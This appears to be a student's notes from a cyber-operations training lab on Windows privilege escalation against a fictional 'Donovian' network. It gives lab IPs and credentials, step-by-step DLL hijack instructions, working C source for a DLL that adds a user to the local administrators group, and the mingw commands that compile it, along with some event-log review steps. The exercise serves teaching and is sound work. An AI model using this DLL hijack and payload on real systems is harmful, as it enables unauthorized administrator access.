@@ -1,0 +1,92 @@
+Donovian Windows Privilege Escalation (DWP)
+XX Jan 2027
+Start Time: 1300
+Duration: 4 hours
+
+Type of Operation: Cyberspace Exploitation (C-E)
+
+Objective: Maneuver into the Donovian internal network, gain privileged access to discovered Windows host.
+
+Tools/Techniques: SSH and RDP masquerade into internal network with provided credentials. Ports in use will be dependent on target location and are subject to change. Windows techniques to gain privileged access such as DLL hijack, UAC bypass through weak paths, permissions, and tasks. Network scanning tools/technique usage is at the discretion of student.
+
+Scenario Credentials: FLAG = 3@SYw1nd0w55t@rt0F@ct1v1ty
+
+Prior Approvals: DLL hijack and UAC bypass, restarting of services through host reboot. Host survey utilizing native command shells, which shell is at discretion of student.
+
+Scheme of Maneuver:
+>Jump Box
+->Pivot: 192.168.28.105
+-->T1: 192.168.28.5
+
+Target Section:
+
+Pivot
+Hostname: ftp.site.donovia
+IP: 192.168.28.105
+OS: Ubuntu 18.04
+Creds: comrade :: StudentReconPassword
+Last Known SSH Port: 2222
+Malware: none
+Action: Perform SSH masquerade and redirect to the next target. No survey required, cohabitation with known PSP approved.
+
+T1
+Hostname: donovian-windows-private
+IP: 192.168.28.5
+OS: Windows ver: Unknown
+Creds: comrade :: StudentPrivPassword
+Last Known Ports: 3389
+PSP: unknown
+Malware: unknown
+Action: Test supplied credentials, if possible gain access to host. Conduct host survey and gain privileged access.
+
+
+Few things to remember:
+1. Build Two -L to connect - First one goes from your jump box to Pivot. Second goes to T1 over port 
+2.File and privleges
+3. DLL - but escalation of privlege. This was determined by trying to access the other escalating privlege capabilities - UAC, etc.
+
+On Windows Box
+1. Go into services from search. Use to identify potentially vulnerable services/programs. Filter on description. Identify programs without a description. 
+2. Logged in as came from column
+3. Navigate to the folder
+4. Identify the service and .c file
+5. View the .c in notepad using command: notepad C:\MemoryStatus\service
+6. construct your .c. To add windows users to a group the command is: net localgroup administrators comrade /add.  to view which admin group: net localgroup administrators
+7. create the executable or the dll
+8. set up a python server - python -m SimpleHTTPServer 8000
+9. Download the .dll.
+10. Move dll into the folder. Rename it to the identified dll you viewed from step 5
+11. turn on the service. you can end the service using taskkill or task manager.
+12. Restart the program and wait for it to deliver to the desktop.
+
+
+Eventviewer steps:
+1. Load the system log
+2. Review the log for specific date. Look for error codes as well
+3. Create a filter (right side) on the log
+4. Filter on Eventcodes.
+5. Look specifically at the General and Details in the bottom half of each event
+6. Look at Service Name and Service File Name for more detail. this will help identify if there is legitimacy. if you see extract actions in the file name its not.
+
+Compliant DLL code for .c file created on Linux Box: This was corrected as a part of the excercise task.
+
+#include <windows.h> 
+int happyfunction()
+{
+ WinExec("cmd /C net localgroup administrators comrade /add", 1);
+ return 0;
+}
+BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
+{
+ happyfunction();
+ return 0;
+}
+
+To create executables and .dll
+
+179  nano ctfhw.c 
+180  i686-w64-mingw32-g++ -c ctfhw.c -o ctfhw.o
+181  i686-w64-mingw32-g++ -shared -o ctfhw.dll ctfhw.o -Wl,--out-implib,ctfhw.a
+      
+
+ 
